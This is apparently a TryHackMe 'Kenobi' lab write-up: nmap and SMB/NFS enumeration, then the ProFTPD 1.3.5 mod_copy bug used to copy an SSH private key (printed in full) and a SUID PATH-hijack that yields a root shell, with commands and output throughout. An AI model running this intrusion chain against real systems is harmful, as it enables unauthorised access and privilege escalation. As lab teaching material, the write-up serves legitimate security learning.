# Kenobi

These notes are from a challenge I did @[tryhackme](https://tryhackme.com) called [Kenobi](https://tryhackme.com/room/kenobi).

## Task 1 Scan

Scan with nmap to see what (and how many) ports are open:```nmap -sC -sV 10.10.153.226```

??? output "Nmap output"
   ``` sh
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:14 EDT
    Nmap scan report for 10.10.153.226
    Host is up (0.019s latency).
    Not shown: 993 closed ports
    PORT     STATE SERVICE     VERSION
    21/tcp   open  ftp         ProFTPD 1.3.5
    22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
    |   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
    |_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
    80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
    | http-robots.txt: 1 disallowed entry
    |_/admin.html
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    111/tcp  open  rpcbind     2-4 (RPC #100000)
    | rpcinfo:
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  2,3,4       2049/tcp   nfs
    |   100003  2,3,4       2049/tcp6  nfs
    |   100003  2,3,4       2049/udp   nfs
    |   100003  2,3,4       2049/udp6  nfs
    |   100005  1,2,3      35315/tcp6  mountd
    |   100005  1,2,3      45048/udp   mountd
    |   100005  1,2,3      51357/udp6  mountd
    |   100005  1,2,3      58477/tcp   mountd
    |   100021  1,3,4      34033/udp   nlockmgr
    |   100021  1,3,4      35441/tcp6  nlockmgr
    |   100021  1,3,4      41257/tcp   nlockmgr
    |   100021  1,3,4      49375/udp6  nlockmgr
    |   100227  2,3         2049/tcp   nfs_acl
    |   100227  2,3         2049/tcp6  nfs_acl
    |   100227  2,3         2049/udp   nfs_acl
    |_  100227  2,3         2049/udp6  nfs_acl
    139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    2049/tcp open  nfs_acl     2-3 (RPC #100227)
    Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
    |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery:
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: kenobi
    |   NetBIOS computer name: KENOBI\x00
    |   Domain name: \x00
    |   FQDN: kenobi
    |_  System time: 2021-09-09T14:14:19-05:00
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode:
    |   2.02:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2021-09-09T19:14:19
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
   ```

## Task 2 Enumerating Samba for shares

Let's enumerate the SMB shares:```nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.153.226```

??? output "Nmap output"
   ``` sh
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:21 EDT
    Nmap scan report for 10.10.153.226
    Host is up (0.018s latency).

    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Host script results:
    | smb-enum-shares:
    |   account_used: guest
    |   \\10.10.153.226\IPC$:
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
    |     Users: 2
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.153.226\anonymous:
    |     Type: STYPE_DISKTREE
    |     Comment:
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\home\kenobi\share
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.153.226\print$:
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>

    Nmap done: 1 IP address (1 host up) scanned in 3.15 seconds
   ```

Let's connect with smbclient as anonymous without a password:```smbclient //10.10.153.226/anonymous```

??? output "smbclient output"
   ``` sh
    smb: \> dir
    .                                   D        0  Wed Sep  4 06:49:09 2019
    ..                                  D        0  Wed Sep  4 06:56:07 2019
    log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                    9204224 blocks of size 1024. 6877100 blocks available
    smb: \> more log.txt

    getting file \log.txt of size 12237 as /tmp/smbmore.DVyJsF (159.3 KiloBytes/sec) (average 161.5 KiloBytes/sec)
    Generating public/private rsa key pair.
    Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
    Created directory '/home/kenobi/.ssh'.
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in /home/kenobi/.ssh/id_rsa.
    Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
    The key fingerprint is:
    SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
    The key's randomart image is:
    +---[RSA 2048]----+
    |                 |
    |           ..    |
    |        . o. .   |
    |       ..=o +.   |
    |      . So.o++o. |
    |  o ...+oo.Bo*o  |
    | o o ..o.o+.@oo  |
    |  . . . E .O+= . |
    |     . .   oBo.  |
    +----[SHA256]-----+

    # This is a basic ProFTPD configuration file (rename it to
    # 'proftpd.conf' for actual use.  It establishes a single server
    # and a single anonymous login.  It assumes that you have a user/group
    # "nobody" and "ftp" for normal operation and anon.

    ServerName                      "ProFTPD Default Installation"
    ServerType                      standalone
    DefaultServer                   on

    # Port 21 is the standard FTP port.
    Port                            21

    # Don't use IPv6 support by default.
    UseIPv6                         off

    # Umask 022 is a good standard umask to prevent new dirs and files
   ```

You can recursively download the SMB share too. Submit the username and password as nothing.

```smbget -R smb://10.10.153.226/anonymous```

??? output "smbget output"
   ``` sh
    Password for [fab1] connecting to //anonymous/10.10.153.226:
    Using workgroup WORKGROUP, user fab1
    smb://10.10.153.226/anonymous/log.txt
    Downloaded 11.95kB in 7 seconds
   ```

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.153.226```

??? output "nmap output"
   ``` sh
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 15:29 EDT
    Nmap scan report for 10.10.153.226
    Host is up (0.018s latency).

    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-showmount:
    |_  /var *

    Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
   ```

## Task 3 - Gain initial access with ProFtpd

To get the version of ProFtpd we can use netcat to connect to the machine on the FTP port:

``` sh
nc 10.10.153.226 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.153.226]
```

Let us look for verunablities for this version:```searchsploit proftpd 1.3.5```

??? output "nmap output"
   ``` sh
    -------------------------------------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                                                    |  Path
    -------------------------------------------------------------------------------------------------- ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                         | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                               | linux/remote/36803.py
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                           | linux/remote/49908.py
    ProFTPd 1.3.5 - File Copy                                                                         | linux/remote/36742.txt
    -------------------------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results
   ```

Let's exploit ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html) and copy Kenobi's private key using SITE CPFR and SITE CPTO commands:

``` sh
nc 10.10.153.226 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.153.226]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Lets mount the /var/tmp directory to our machine

``` sh
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.153.226:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cat id_rsa
```

??? output "id_rsa content"
   ``` sh
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXs
    qpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nv
    U7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJt
    dwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorW
    y3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdSt
    otHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCI
    ruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJ
    dCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqM
    bxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVry
    tRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36
    YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnCl
    bUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66e
    t8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVul
    rwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0c
    dd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtq
    mgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvl
    SR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCs
    dmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9
    u/vVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/Pph
    YNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7
    TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7
    P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8
    H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjF
    S40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWf
    Py/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo
    -----END RSA PRIVATE KEY-----
   ```

Change access rights of `id_rsa` and login as kenobi to read `user.txt`:

``` sh
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.153.226
cat /home/kenobi/user.txt
```

## Task 4  Privilege Escalation with Path Variable Manipulation

To search the a system for SUID bits run the following:```find / -perm -u=s -type f 2>/dev/null```

??? output "SUID bits"
   ``` sh
    /sbin/mount.nfs
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/bin/chfn
    /usr/bin/newgidmap
    /usr/bin/pkexec
    /usr/bin/passwd
    /usr/bin/newuidmap
    /usr/bin/gpasswd
    /usr/bin/menu
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/newgrp
    /bin/umount
    /bin/fusermount
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6
   ```

Running```/usr/bin/menu``` shows us the binary is running without a full path:

``` txt
1. status check
2. kernel version
3. ifconfig
```

We can exploit this by replacing commands e.g. sh instead of curl and then update the $PATH variable:

``` sh
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

We can now run```/usr/bin/menu``` again and when selecting #`1` we execute `sh` (instead of curl). We are now rood (run```id```) and can access the final flag:```/cat /root/root.txt```.
